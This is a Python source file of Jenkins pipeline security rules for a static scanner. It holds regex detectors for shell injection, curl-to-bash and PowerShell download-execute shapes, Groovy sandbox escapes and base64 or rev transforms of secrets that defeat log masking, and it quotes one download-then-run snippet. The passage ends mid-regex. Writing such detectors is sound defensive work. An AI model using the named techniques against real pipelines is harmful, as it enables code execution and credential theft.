"""Jenkins pipeline security rules.

Covers Jenkinsfile (declarative and scripted) and Groovy pipeline files.
Rules map to the OWASP CI/CD Top 10 where applicable.

Jenkins pipelines have unique risk characteristics:
- Groovy is a full programming language — arbitrary code execution is trivial
- Shared libraries extend the attack surface across every pipeline that loads them
- `agent any` allows jobs to run on any connected node, including untrusted ones
- Credentials bound via withCredentials() are in-memory but echo/sh can leak them
- `params.*` values come directly from build triggers and may be attacker-controlled
"""

import re

from taintly.models import (
    ContextPattern,
    Platform,
    RegexPattern,
    Rule,
    SequencePattern,
    Severity,
)


class _NodeBlockWithoutLabelPattern:
    """SEC7-JK-002 — fire on ``node {`` blocks that lack a ``label`` directive.

    Replaces the prior single-line regex that misclassified the
    declarative ``agent { node { label 'x' } }`` shape (label on a
    later line, not inline as ``node('x') { ... }``).  Real
    Jenkinsfiles using the declarative form must not fire.

    Walker contract: scan brace-depth from the matching ``node {``
    line until depth returns to baseline; if a ``label '<value>'``
    directive appears inside that span, suppress the finding.
    """

    _NODE_RE = re.compile(r"^\s*node\s*(?:\(\s*\))?\s*\{")
    _LABEL_RE = re.compile(r"^\s*label\s+['\"]")
    _COMMENT_RE = re.compile(r"^\s*//")
    _INLINE_LABEL_RE = re.compile(r"node\s*\(\s*['\"]")  # node('x') { } — not our shape

    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
        results: list[tuple[int, str]] = []
        i = 0
        n = len(lines)
        while i < n:
            line = lines[i]
            if self._COMMENT_RE.search(line) or self._INLINE_LABEL_RE.search(line):
                i += 1
                continue
            if not self._NODE_RE.search(line):
                i += 1
                continue
            depth = line.count("{") - line.count("}")
            has_label = False
            j = i + 1
            while j < n and depth > 0:
                inner = lines[j]
                if self._LABEL_RE.search(inner):
                    has_label = True
                    break
                depth += inner.count("{") - inner.count("}")
                j += 1
            if not has_label:
                results.append((i + 1, line.strip()))
            i += 1
        return results


# =========================================================================
# Shared shell-body predicate infrastructure.
#
# Rules in this module that need to reason about the CONTENT of a
# ``sh '...'`` / ``bat '...'`` / ``powershell '...'`` body — and only
# the body, not arbitrary string literals elsewhere in the
# Jenkinsfile — consume the structural reader at
# ``taintly.parsers.jenkinsfile``.  The reader is gated on the
# optional ``[jenkins-structural]`` extra (tree-sitter-groovy).  When
# the extra is not installed, the pattern below falls back to a small
# Groovy-mask-aware regex extractor for literal shell-call bodies.  That
# keeps default installs and CI self-tests honest without claiming full
# tree-sitter coverage.
# =========================================================================


class _JenkinsfileShellLeafPattern:
    """Fire on ``sh|bat|powershell`` body strings matching a predicate.

    The structural Jenkinsfile reader yields ``LEAF`` events with
    ``value_kind="shell"`` for the body string of every shell sink
    in the Jenkinsfile.  This pattern routes every such body
    through ``predicate(body) -> bool`` and emits one finding per
    matching body, anchored at the call's line.

    The snippet anchored at ``ev.line`` is the call-site line
    (e.g. ``sh '''`` for a triple-quoted body), which preserves the
    pattern-contract requirement that snippet text derives from the
    cited line.  For multi-line bodies the call-site line carries the
    structural cue; reviewers follow up by reading the body.

    Why a custom Pattern (not RegexPattern):
      * RegexPattern matches each line in isolation, so it cannot
        tell whether a regex match sits INSIDE a ``sh '''...'''``
        body (vulnerability) or inside an unrelated string literal /
        Groovy comment (false positive).
      * The structural reader gives us the body — and only the body
        — as a single string, eliminating the FP class.

    Failure-soft contract:
      * Import of the structural reader is gated on the optional
        ``[jenkins-structural]`` extra.  Missing extra ⇒ use the
        regex shell-body fallback below.
      * Parse errors in the Jenkinsfile produce a ``CUTOFF`` event
        from the walker; we honour that by stopping the walk.
    """

    def __init__(self, predicate):
        self._predicate = predicate

    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
        try:
            from taintly.parsers.jenkinsfile import EventKind, walk_jenkinsfile
        except ImportError:
            return self._regex_fallback(content, lines)

        results: list[tuple[int, str]] = []
        seen: set[tuple[int, str]] = set()
        try:
            for ev in walk_jenkinsfile(content, recover=True):
                if ev.kind == EventKind.CUTOFF:
                    break
                if ev.kind != EventKind.LEAF or ev.value_kind != "shell":
                    continue
                if not ev.value:
                    continue
                # predicate(body, interpolated): quote-aware rules use the
                # second arg to fire only on interpolating GString bodies.
                if not self._predicate(ev.value, ev.interpolated):
                    continue
                if 0 < ev.line <= len(lines):
                    snippet = lines[ev.line - 1].strip() or ev.value.strip()
                else:
                    snippet = ev.value.strip()
                key = (ev.line, snippet)
                if key in seen:
                    continue
                seen.add(key)
                results.append(key)
        except ImportError:
            # ``walk_jenkinsfile`` imports cleanly without the optional
            # extra; the ImportError is raised lazily on first parse.
            return self._regex_fallback(content, lines)
        except Exception:  # nosec B110 - walker failures (unexpected node shape) must not break scans; fall back to no findings
            return []
        return results

    _SHELL_CALL_RE = re.compile(
        r"\b(?:sh|bat|powershell)\s*(?:\(\s*)?(?P<quote>'''|\"\"\"|'|\")",
        re.IGNORECASE,
    )

    def _regex_fallback(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
        """Fallback shell-body extractor for default installs.

        It is deliberately narrower than the structural reader: only
        literal ``sh|bat|powershell '...'`` / ``"..."`` calls are
        extracted, and Groovy strings/comments are masked so prose does
        not satisfy the shell-call opener.  Complex named-argument forms
        remain tree-sitter territory.
        """
        from taintly.jenkinsguard import _groovy_code_mask

        code_mask = _groovy_code_mask(content)
        results: list[tuple[int, str]] = []
        seen: set[tuple[int, str]] = set()
        for match in self._SHELL_CALL_RE.finditer(content):
            if not code_mask[match.start()]:
                continue
            quote = match.group("quote")
            body_start = match.end()
            body_end = content.find(quote, body_start)
            if body_end < 0:
                continue
            body = content[body_start:body_end]
            # Double / triple-double quotes are interpolating GStrings; single
            # quotes leave ${...} literal. Mirrors the island reader's flag so
            # quote-aware predicates behave identically on the fallback path.
            interpolated = quote in ('"', '"""')
            if not self._predicate(body, interpolated):
                continue
            line_num = content.count("\n", 0, match.start()) + 1
            snippet = lines[line_num - 1].strip() if 0 < line_num <= len(lines) else body.strip()
            key = (line_num, snippet or body.strip())
            if key in seen:
                continue
            seen.add(key)
            results.append(key)
        return results


# --- Quote-aware structural predicates for the injection family. Each reads the
# shell-sink body from the island reader and fires only when the body is an
# INTERPOLATING GString (interpolated=True) — a single-quoted body leaves
# ${params.X}/${env.X} literal (no Groovy interpolation) and is NOT the finding.
# The body regexes are the originals minus the `(?:sh|...)\s+"{1,3}.*` call/quote
# wrapper, which the structural reader (incl. the sh(script:...) method form and
# pwsh) now handles. ---
_SEC4_JK_001_BODY_RE = re.compile(
    r"\$\{\s*params\s*(?:\.[A-Za-z_][A-Za-z0-9_-]*|\[['\"][^'\"]+['\"]\])\s*\}"
)


def _sec4_jk_001_predicate(shell_body: str, interpolated: bool) -> bool:
    """SEC4-JK-001: a user-controlled build parameter (``${params.X}``)
    interpolated into a shell sink, GString only."""
    return interpolated and bool(_SEC4_JK_001_BODY_RE.search(shell_body))


_SEC4_JK_002_BODY_RE = re.compile(
    r"\$\{?env\.(?:GIT_BRANCH|BRANCH_NAME|CHANGE_BRANCH|CHANGE_TITLE"
    r"|CHANGE_AUTHOR|TAG_NAME|ghprb\w+)"
)


def _sec4_jk_002_predicate(shell_body: str, interpolated: bool) -> bool:
    """SEC4-JK-002: an SCM-controlled env var (``${env.GIT_BRANCH}`` etc.)
    interpolated into a shell sink, GString only."""
    return interpolated and bool(_SEC4_JK_002_BODY_RE.search(shell_body))


_SEC4_JK_008_BODY_RE = re.compile(
    r"\$\{?\s*env\s*\.\s*(?!(?:JOB_NAME|JOB_BASE_NAME|JOB_URL|"
    r"BUILD_NUMBER|BUILD_ID|BUILD_TAG|BUILD_URL|"
    r"BUILD_DISPLAY_NAME|STAGE_NAME|RUN_DISPLAY_URL|"
    r"RUN_ARTIFACTS_DISPLAY_URL|RUN_CHANGES_DISPLAY_URL|"
    r"WORKSPACE|JENKINS_HOME|JENKINS_URL|"
    r"NODE_NAME|NODE_LABELS|EXECUTOR_NUMBER|"
    r"PATH|HOME|USER|HOSTNAME|"
    r"BRANCH_NAME|CHANGE_ID|CHANGE_TARGET|GIT_COMMIT|GIT_BRANCH|GIT_URL"
    r")\b)[A-Za-z_]"
)


def _sec4_jk_008_predicate(shell_body: str, interpolated: bool) -> bool:
    """SEC4-JK-008: a user-defined env var (not a Jenkins built-in) interpolated
    into a shell sink, GString only — review-needed provenance."""
    return interpolated and bool(_SEC4_JK_008_BODY_RE.search(shell_body))


_SEC9_JK_001_BODY_RE = re.compile(r"(?:curl|wget)\s+\S[^\n]*\|\s*(?:ba)?sh\b")


def _sec9_jk_001_predicate(shell_body: str, _interpolated: bool = False) -> bool:
    """SEC9-JK-001 (structural): a SINGLE shell line downloads (curl/wget) and
    pipes straight to an interpreter (``| sh`` / ``| bash``). Reads the
    shell-sink body from the island reader, so the ``sh(script: 'curl ... |
    bash')`` method-call form is now caught — the prior ``sh\\s+<quote>`` regex
    missed it. Kept SAME-LINE only (per-line search) to preserve the partition
    with SEC9-JK-004, which owns the cross-line / non-shell-pipe / two-step
    shapes (avoids double-report)."""
    return any(_SEC9_JK_001_BODY_RE.search(line) for line in shell_body.splitlines())


# Predicate for SEC9-JK-004: download-pipe-to-interpreter and PowerShell
# remote-execution shapes the line-scoped SEC9-JK-001 regex cannot
# reach.  Compiled once at module load.  The command-start anchor
# (``^`` / whitespace / ``;`` / ``&&`` / ``||`` / ``|`` / ``(`` /
# backtick) keeps the predicate from firing on text that merely
# *contains* the literal substring ``curl ... | bash`` inside an
# unrelated argument.
#
# Critical scoping: alternative 1 (download pipe to interpreter)
# DELIBERATELY EXCLUDES ``bash`` / ``sh`` / ``zsh`` / ``dash`` /
# ``ksh`` from the interpreter list.  Those are SEC9-JK-001's
# coverage when the shell sink and the pipe live on the same line.
# Listing them here would produce a redundant co-fire with
# SEC9-JK-001 on every classic ``sh 'curl ... | bash'`` fixture,
# which is bad rule hygiene — the reviewer sees two findings for
# one defect, and the no-rules-change-gate hash drifts on every
# pre-existing SEC9-JK-001 fixture.  The multi-line triple-quoted
# ``sh '''…curl…|bash…'''`` case is handled by the dedicated
# alternative below that requires a newline inside the body — the
# walker presents the body as a single string, so the predicate
# can detect "this body spans multiple source lines, therefore
# SEC9-JK-001's line-scoped regex cannot have matched it."
_SEC9_JK_004_PREDICATE_RE = re.compile(
    r"(?:"
    # 1) curl / wget / fetch piped directly to a NON-shell scripting
    #    interpreter (with optional sudo).  Shell interpreters
    #    (bash/sh/zsh/dash/ksh) are intentionally excluded — see
    #    the block comment above; SEC9-JK-001 owns the single-line
    #    shell-pipe shape on its own line.
    r"(?:^|[;&|()`$]|\s)\s*"
    r"(?:curl|wget|fetch)\b[^|\n]+\|\s*(?:sudo\s+)?"
    r"(?:python(?:2|3)?|perl|ruby|node|php)\b"
    # 2) Process-substitution: ``bash <(curl ...)`` / ``sh <(...)``.
    #    No ``|`` token between curl and the interpreter, so the
    #    SEC9-JK-001 ``\|\s*(ba)?sh`` predicate cannot fire here.
    r"|(?:^|[;&|()`$]|\s)\s*(?:bash|sh|zsh)\s+<\s*\(\s*(?:curl|wget|fetch)\b"
    # 3) PowerShell ``iex(Invoke-WebRequest ...)`` and equivalents:
    #    ``iex(IWR …)``, ``iex(Invoke-RestMethod …)``,
    #    ``iex(New-Object … DownloadString …)``.  Semantic equivalent
    #    of ``curl | bash`` for Jenkins Windows agents.
    r"|(?:iex|Invoke-Expression)\s*[\(\s]+(?:[^)]*?\b"
    r"(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm"
    r"|New-Object\s+System\.Net\.WebClient|DownloadString)\b)"
    # 4) PowerShell alt arrangement: ``IWR ... | iex`` /
    #    ``Invoke-RestMethod ... | iex``.
    r"|\b(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm)\b[^|\n]+"
    r"\|\s*(?:iex|Invoke-Expression)\b"
    # 5) Command-substitution flavour: ``$(curl ...) | bash``.
    r"|\$\(\s*(?:curl|wget)\b[^)]+\)\s*\|\s*(?:bash|sh|zsh|python|perl|ruby)"
    r")",
    re.IGNORECASE | re.DOTALL,
)


# Auxiliary predicate for the multi-line triple-quoted case: the
# body spans multiple source lines (contains a newline) AND
# contains ``curl|wget ... | (ba)?sh`` somewhere inside.  The
# walker presents this body as one string so the predicate can
# see the pipe; the line-scoped SEC9-JK-001 regex cannot.  This
# is the ONLY case where SEC9-JK-004 fires on the ``| bash`` /
# ``| sh`` shape that SEC9-JK-001 also targets — and it fires
# precisely because SEC9-JK-001 structurally can't.
_SEC9_JK_004_MULTILINE_SHELL_PIPE_RE = re.compile(
    r"(?:^|[;&|()`$]|\s)\s*(?:curl|wget|fetch)\b[^|\n]+"
    r"\|\s*(?:sudo\s+)?(?:bash|sh|zsh|dash|ksh)\b",
    re.IGNORECASE,
)


# Two-step download-then-execute shape within one multi-line shell
# body — surfaced by 2026-05-18 audit on apache/cassandra
# `.jenkins/Jenkinsfile`:
#
#     sh """#!/bin/bash
#         wget -q ${agentScriptsUrl}/docker_agent_cleaner.sh
#         bash docker_agent_cleaner.sh ${maxBuildHours}
#     """
#
# SEC9-JK-001 (sh '...curl|bash') needs the pipe on a single line.
# SEC9-JK-003 (sh '...wget ... .sh') needs the wget and the filename
# on the same line as the `sh` token, and its SequencePattern matcher
# applies the regex per line — neither sees a download command on
# line A + a `bash X` command on line B inside the same triple-quoted
# body.  This predicate sees the whole body as one string (the
# structural walker concatenates) and flags the two-step shape when:
#   1. Body downloads a script-like file via curl / wget / fetch
#   2. Body later invokes an interpreter on a script-like file
#   3. Body contains NO checksum verification command between them
_SEC9_JK_004_TWO_STEP_DOWNLOAD_RE = re.compile(
    r"\b(?:curl|wget|fetch)\b[^\n]*\S+\.(?:sh|py|pl|rb|js|ps1|bash|zsh|fish)\b",
    re.IGNORECASE,
)
_SEC9_JK_004_TWO_STEP_EXEC_RE = re.compile(
    # Standalone interpreter invocation on a script-like filename.
    # The (?<![|`]\s{0,5}) lookbehind avoids matching the pipe form
    # (``... | bash``) which SEC9-JK-001 / the multi-line shell-pipe
    # branch above already cover.
    r"(?<![|`])"
    r"(?:^|[;&\n]|\b(?:then|do|else)\b)\s*"
    r"(?:sudo\s+)?(?:bash|sh|zsh|dash|ksh|python(?:2|3)?|perl|ruby|node|php)"
    r"\s+(?:-[\w]+\s+)*\S+\.(?:sh|py|pl|rb|js|ps1|bash|zsh|fish)\b",
    re.IGNORECASE,
)
# Common in-band integrity-verification primitives.  When ANY of
# these appears in the body, the two-step download-exec is presumed
# verified — don't fire.  This is heuristic: we don't try to confirm
# the verification ACTUALLY covers the downloaded filename.  Operators
# who want strict cosign/sha-pair binding can disable suppression in
# .taintly.yml.
_SEC9_JK_004_TWO_STEP_CHECKSUM_RE = re.compile(
    r"\b(?:sha(?:1|224|256|384|512)sum|md5sum|b3sum"
    r"|cosign\s+verify|gpg\s+--verify|gpg\s+verify"
    r"|sigstore\s+verify|cosign\s+verify-blob"
    r"|openssl\s+dgst)\b",
    re.IGNORECASE,
)


def _sec9_jk_004_predicate(shell_body: str, _interpolated: bool = False) -> bool:
    """Return True when a shell body matches a download-pipe-to-
    interpreter or PowerShell remote-execution shape that the
    line-scoped SEC9-JK-001 regex cannot reach.

    Three classes of match:
      * Non-shell interpreter pipes / process substitution / iex(IWR).
        These never matched SEC9-JK-001's regex at all.
      * Multi-line triple-quoted shell body containing
        ``curl ... | bash``.  The walker hands us the body as one
        string spanning multiple source lines; SEC9-JK-001's
        per-line regex cannot see the curl-and-bash on different
        source lines.  Gated on the body containing a newline so
        the single-line shell-pipe case stays SEC9-JK-001's.
    """
    if _SEC9_JK_004_PREDICATE_RE.search(shell_body):
        return True
    # Multi-line shell-pipe case.  Require an explicit newline so
    # the single-line ``sh 'curl|bash'`` (SEC9-JK-001's coverage)
    # is not double-reported.
    if "\n" in shell_body and _SEC9_JK_004_MULTILINE_SHELL_PIPE_RE.search(shell_body):
        return True
    # Two-step download-then-execute case: body has both a curl/wget
    # of a script-like file AND a subsequent interpreter invocation
    # on a script-like file, with no checksum-verification command
    # in between.  The download and exec must be on DIFFERENT lines —
    # the single-line ``wget x.sh && bash x.sh`` shape is SEC9-JK-003's
    # coverage.  Surfaced by 2026-05-18 audit on apache/cassandra
    # ``.jenkins/Jenkinsfile``.
    if not _SEC9_JK_004_TWO_STEP_CHECKSUM_RE.search(shell_body):
        download_lines = {
            i
            for i, line in enumerate(shell_body.splitlines())
            if _SEC9_JK_004_TWO_STEP_DOWNLOAD_RE.search(line)
        }
        exec_lines = {
            i
            for i, line in enumerate(shell_body.splitlines())
            if _SEC9_JK_004_TWO_STEP_EXEC_RE.search(line)
        }
        if download_lines and exec_lines and max(exec_lines) > min(download_lines):
            return True
    return False


class _GrabSandboxEscapePattern:
    """SEC4-JK-011 — an ``@Grab`` annotation paired with a process-execution
    class is a Groovy Script-Security **sandbox escape** (CVE-2019-1003000 /
    SECURITY-1538 family).

    ``@Grab`` is resolved and executed by Groovy Grape at *compile time*,
    before the Jenkins Script Security sandbox engages. A pipeline — or a
    sandboxed shared-library / job-DSL script — that ``@Grab``s a dependency
    and then drives a process-execution class (``ProcBuilder`` /
    ``Runtime.getRuntime`` / ``new ProcessBuilder``) reaches arbitrary OS
    command execution that the sandbox cannot intercept.

    Distinct from SEC3-JK-002 (unversioned ``@Grab`` = dependency *float*):
    the escape does not depend on the version, so this fires on *any* ``@Grab``
    — including a pinned ``@Grab('g:a:1.2.3')`` — but **only** when an in-file
    process-execution escape co-occurs. A bare versioned ``@Grab`` with no
    execution sink does not fire, keeping legitimate pinned Grape usage clean.
    """

    _GRAB_RE = re.compile(r"@Grab\s*\(")
    _COMMENT_RE = re.compile(r"^\s*(?://|\*|/\*)")
    _EXEC_RE = re.compile(r"\bProcBuilder\b|\bRuntime\s*\.\s*getRuntime\b|\bnew\s+ProcessBuilder\b")

    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
        if not self._EXEC_RE.search(content):
            return []
        out: list[tuple[int, str]] = []
        for i, line in enumerate(lines, 1):
            if self._COMMENT_RE.match(line):
                continue
            if self._GRAB_RE.search(line):
                # Snippet must be the actual source line (Pattern.check contract):
                # the @Grab annotation is the evidence; the sandbox-escape rationale
                # lives in the rule description / threat_narrative.
                out.append((i, line.strip()))
        return out


class _MaskedGroovyLinePattern:
    """Shared base for the sandbox-bypass family (SEC4-JK-012/013/014).

    Every member fires on a *single, unambiguous* Groovy sandbox-escape
    primitive, and every member must avoid the two false-positive classes
    that the lab corpus proved are real for this rule family:

      1. the primitive appearing inside a string literal / GString / comment
         (e.g. a remediation snippet in a docstring, a log message mentioning
         ``Runtime.getRuntime``);
      2. a benign homonym in legitimate shared-library code (``stage.execute()``
         on a domain object, ``Jenkins.instance.pluginManager`` plugin-mgmt).

    (1) is handled here by reusing the Groovy code-mask
    (:func:`taintly.jenkinsguard._groovy_code_mask`) so a match only counts
    when its anchor character sits in real code position.  (2) is handled by
    each subclass's regex being narrow enough that the benign homonyms never
    match (see ``_PRIMITIVE_RE`` docstrings) — verified at 0/871 corpus files.
    """

    _PRIMITIVE_RE: re.Pattern[str]

    def _anchor_offset(self, m: re.Match[str]) -> int:
        """Offset (within the matched line) of the character whose code/string
        position decides whether the match is real code.

        Default = match start.  Subclasses whose match deliberately begins on a
        string delimiter (e.g. the ``"cmd"`` receiver of ``"cmd".execute()``)
        override this to point at the *keyword* token (``execute``), which is
        the part that must live in code position — the quoted receiver is, by
        design, inside a string.
        """
        return m.start()

    def check(self, content: str, _lines: list[str]) -> list[tuple[int, str]]:
        from taintly.jenkinsguard import _groovy_code_mask

        mask = _groovy_code_mask(content)
        out: list[tuple[int, str]] = []
        offset = 0
        for i, line in enumerate(content.split("\n"), 1):
            line_start = offset
            offset += len(line) + 1
            for m in self._PRIMITIVE_RE.finditer(line):
                pos = line_start + self._anchor_offset(m)
                # The anchor character must be real code, not inside a
                # string/comment region.  This is what stops a finding from
                # firing on the primitive quoted inside a log message or a
                # block comment.
                if pos < len(mask) and not mask[pos]:
                    continue
                out.append((i, line.strip()))
                break  # one finding per line is enough evidence
        return out


class _DirectProcessExecPattern(_MaskedGroovyLinePattern):
    """SEC4-JK-012 — direct OS process execution from Groovy.

    The Script-Security sandbox blocks process-spawning APIs; these are the
    canonical Groovy command-exec signatures that an attacker reaches once the
    sandbox is bypassed (or in trusted-library / Groovy-console contexts where
    no sandbox applies).  Anchored on the three unambiguous shapes:

      * ``"<cmd>".execute()`` / ``'<cmd>'.execute()`` / ``${expr}.execute()`` /
        ``[...].execute()`` — the Groovy String/GString/List process-exec
        idiom.  Anchored on a **string/GString/list receiver** so the very
        common benign ``stage.execute()`` / ``request.execute()`` method call
        on a domain object does NOT fire (22/871 corpus files use the benign
        form; 0 use the dangerous string-receiver form).
      * ``Runtime.getRuntime().exec`` / ``Runtime.runtime.exec`` — the classic
        Java exec sink.
      * ``new ProcessBuilder(`` — the ProcessBuilder spawn.
    """

    # Receiver must be a closing quote / brace / bracket immediately before
    # ``.execute()`` — i.e. a String, GString, or List literal, never a plain
    # identifier (``stage.execute()``).  ``\)`` is deliberately excluded so a
    # method-chain like ``stage.run().execute()`` does not fire on the chain.
    #
    # The ``kw`` group marks the keyword token (``execute`` / ``exec`` /
    # ``ProcessBuilder``) whose code-position decides the match: for the
    # string-receiver ``.execute()`` form the match *starts* on the quote
    # delimiter (which is correctly inside-string per the Groovy mask), so we
    # anchor the code-position check on ``kw`` instead.
    _PRIMITIVE_RE = re.compile(
        r"""(?x)
        (?:
            ["'\]}]\s*\.\s*(?P<kw>execute)\s*\(\s*\)   # "cmd".execute() / [..].execute() / ${..}.execute()
          | \bRuntime\s*\.\s*(?:getRuntime\s*\(\s*\)|runtime)\s*\.\s*(?P<kw2>exec)\b
          | \bnew\s+(?P<kw3>ProcessBuilder)\s*\(
        )
        """
    )

    # A live ``@Grab`` anywhere in the file means SEC4-JK-011 already owns the
    # exec-sink finding (with the richer compile-time-bypass narrative); yield
    # to it so the @Grab-plus-exec shape is reported once, by the more specific
    # rule, rather than as two findings on adjacent lines.
    _GRAB_RE = re.compile(r"@Grab\s*\(")

    def _anchor_offset(self, m: re.Match[str]) -> int:
        # Anchor on whichever keyword group matched — never on the (possibly
        # quoted) receiver that begins the ``.execute()`` alternative.
        for name in ("kw", "kw2", "kw3"):
            if m.group(name) is not None:
                return m.start(name)
        return m.start()

    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
        from taintly.jenkinsguard import _groovy_code_mask

        # When a live (non-comment) ``@Grab(`` is present, defer the entire
        # file to SEC4-JK-011 to avoid double-reporting the same sandbox-escape
        # shape.  Check against the code mask so a commented-out @Grab does not
        # suppress a real exec sink.
        mask = _groovy_code_mask(content)
        for gm in self._GRAB_RE.finditer(content):
            if gm.start() < len(mask) and mask[gm.start()]:
                return []
        return super().check(content, lines)


class _ReflectionSandboxBypassPattern(_MaskedGroovyLinePattern):
    """SEC4-JK-013 — Script-Security reflection / dynamic-compile bypass.

    The SECURITY-1353 (CVE-2019-1003040 / -1003041) escape class: reaching
    arbitrary method dispatch or runtime Groovy compilation through reflective
    primitives the sandbox does not (or historically did not) intercept.
    Anchored on the unambiguous, never-benign signatures only:

      * ``ScriptBytecodeAdapter`` — the Groovy runtime dispatch helper used in
        the SECURITY-1353 PoC; appears in no legitimate pipeline.
      * ``.castToType(`` / ``.asType(`` *on a method-closure / class object* —
        the cast primitive abused to invoke private/blocked methods.  Anchored
        as ``ScriptBytecodeAdapter.castToType`` OR a standalone ``castToType(``
        call (not the safe ``x as Type`` operator).
      * ``MethodClosure`` (the class, not the ``.&m`` operator) — direct
        construction of a method closure to reach a blocked method.  The bare
        ``.&method`` *operator* is idiomatic and is NOT matched (4/871 corpus
        files use the safe operator; 0 reference the MethodClosure class).
      * ``new GroovyShell(`` ... ``.evaluate`` / ``.parse`` and
        ``GroovyClassLoader(...).parseClass`` — runtime compilation of a
        Groovy source string, a code-execution sink distinct from the
        ``evaluate()`` / ``Eval`` builtins SEC4-JK-003 already covers.
        Anchored on the *constructor* (``new GroovyShell(`` / ``new
        GroovyClassLoader(``) + a ``.parse`` / ``.parseClass`` /
        ``.evaluate`` call, so the benign ``GroovyClassLoader`` *type
        annotation* (7/871 corpus lines, all in a classloader-cleanup util)
        does not fire.
    """

    _PRIMITIVE_RE = re.compile(
        r"""(?x)
        (?:
            \bScriptBytecodeAdapter\b
          | \bcastToType\s*\(
          | \bMethodClosure\b
          | \bnew\s+GroovyShell\s*\(
          | \.\s*parseClass\s*\(
        )
        """
    )


class _GrapeResolverConfigPattern(_MaskedGroovyLinePattern):
    """SEC4-JK-014 — ``@GrabResolver`` / ``@GrabConfig`` Grape AST annotations.

    Siblings of ``@Grab`` (SEC4-JK-011): they are Grape directives processed by
    an AST transform at *compile time*, before the Script-Security sandbox
    engages — the SECURITY-1266 (CVE-2019-1003000) compile-time-bypass root
    cause.  ``@GrabResolver`` adds an attacker-chosen Maven repository
    (so ``@Grab`` can pull a JAR from anywhere) and ``@GrabConfig(
    systemClassLoader=true)`` forces the grabbed JAR onto the system
    classloader — both materially widen the compile-time RCE surface.

    Distinct from SEC4-JK-011, which fires only on ``@Grab`` + an in-file
    process-execution class.  These annotations are dangerous on their own
    (they reconfigure where/how compile-time code loads) and are vanishingly
    rare in legitimate pipelines (0/871 corpus files), so they fire
    standalone as recall insurance.  Distinct from SEC3-JK-002 (unversioned
    ``@Grab`` float): the AST-bypass risk does not depend on a version.
    """

    _PRIMITIVE_RE = re.compile(r"@Grab(?:Resolver|Config)\s*\(")


class _SecretExfilTransformPattern:
    """SEC6-JK-011 — a credential bound by ``withCredentials`` /
    ``credentials()`` is run through an **encode / obfuscate transform**
    inside a shell step (the Jenkins log-masking **bypass**).

    Threat (CICD-SEC-6; Jenkins' own credentials-masking blog + the
    SECURITY-3547 / CVE-2025-53651 masking-limit advisory family).  Jenkins
    redacts the *verbatim* secret value from the console log on a best-effort
    basis.  It cannot redact a *transformed* secret: ``echo $TOKEN | base64``,
    ``echo $PASS | rev``, ``printf %s "$KEY" | xxd``, ``openssl enc`` of the
    secret — each emits bytes the SecretPatterns matcher never sees, so the
    encoded secret slips into the log (and from there into any log-aggregation
    sink) in plain view of anyone with build-log access.  The decoded value is
    trivially recoverable.  This is the masking-bypass class that the existing
    SEC6-JK credential rules miss:

      * SEC6-JK-002 / SEC6-JK-003 catch the DIRECT ``echo $CRED`` / ``println``
        leak (the verbatim form Jenkins at least *tries* to mask).
      * SEC4-JK-006 catches the OPPOSITE direction — ``base64 -d | bash``
        (decode-then-EXECUTE, a supply-chain RCE) — and explicitly treats
        ``echo $PASSWORD | base64`` (the ENCODE direction) as a negative.
      * This rule owns the ENCODE / OBFUSCATE-then-leak direction applied to a
        *bound credential variable*.

    Precision design (verify-first on the 65 credential-binding corpus files):
    the rule keys on a **transform tool applied to a bound-credential variable**,
    NOT on "a credential reaches a network call".  The dominant corpus shape is
    legitimate authenticated egress —
    ``sh "curl --user \\"$user:$pass\\" ..."`` / ``--cert "$KEY"`` —
    which passes the secret to the *intended* TLS endpoint and must stay clean.
    So plain ``curl``/``wget`` are deliberately NOT triggers; only an
    encode/obfuscate transform of the secret is.  ``base64 -d`` / ``--decode``
    (the decode direction) is excluded so this never co-fires with SEC4-JK-006.

    Credential variable names come from two sources:
      * ``withCredentials([... variable: 'X' / passwordVariable: 'X' /
        usernameVariable: 'X' / keyFileVariable: 'X' / tokenVariable: 'X' ...])``
        bindings — read structurally from the island walker's named-arg LEAFs;
      * ``NAME = credentials('id')`` ``environment {}`` assignments — read by a
        small regex (the walker does not surface env-block assignment names).

    Shell bodies are read structurally (the island walker's ``value_kind=
    "shell"`` LEAFs), so the transform must sit in an actual ``sh``/``bat``/
    ``powershell``/``pwsh`` body — never in a comment or an unrelated string
    literal.  Credential vars are matched file-flat (any transform of a bound
    secret leaks it regardless of which nested scope the sink sits in), which is
    the correct soundness boundary for a masking-bypass finding.

    Recall-safety: ADDITIVE.  Reconstructed-fixture-gated recall insurance —
    0 corpus signal for the transform shape (measured: 0/65 credential-binding
    files apply an encode transform to a bound secret), 0 FP on the same 65
    files (all credential-in-sink shapes there are legitimate authenticated
    egress, which this rule does not target).  Same gate policy as SEC4-JK-011
    (``@Grab``): real CVE/advisory threat, ship once the FP-on-real-corpus side
    is proven clean.

    Failure-soft: any walker exception is swallowed to ``[]`` — a scan must
    never crash on an unmodelled Groovy shape (matches the other JK patterns).
    """

    # withCredentials binding-variable named args (the variable that holds the
    # secret value at shell-execution time).
    _BIND_VAR_KEYS = frozenset(
        {
            "variable",
            "passwordVariable",
            "usernameVariable",
            "keyFileVariable",
            "tokenVariable",
        }
    )

    # ``NAME = credentials('id')`` environment{}-block binding — the walker does
    # not emit env-block assignment names, so read them here.  ALL-CAPS / under-
    # score env-var convention; the RHS must be a ``credentials(...)`` call.
    _CREDS_ENV_RE = re.compile(
        r"\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*credentials\s*\(",
    )

    # Encode / obfuscate transforms that defeat verbatim log masking.  Each is
    # anchored so it cannot match an unrelated token (``base64`` inside a path,
    # ``rev`` inside ``revision``).  ``base64 -d`` / ``--decode`` is the DECODE
    # direction (SEC4-JK-006's territory) and is excluded via the negative
    # lookahead so the two rules never co-fire.
    _TRANSFORM_RE = re.compile(
        r"(?:"
        # base64 ENCODE (no -d / --decode flag) — the masking-bypass direction.
        r"\bbase64\b(?!\s+(?:-d\b|--decode\b))"
        # byte/hex obfuscators.
        r"|\bxxd\b|\bod\b|\bhexdump\b"
        # reverse — classic two-echo masking dodge.
        r"|\brev\b"
        # tr-based transliteration / ROT.
        r"|\btr\s+['\"]?[A-Za-z0-9]"
        # openssl symmetric ENCODE (exclude the -d decrypt direction).
        r"|\bopenssl\s+enc\b(?![^|\n]*\s-d\b)"
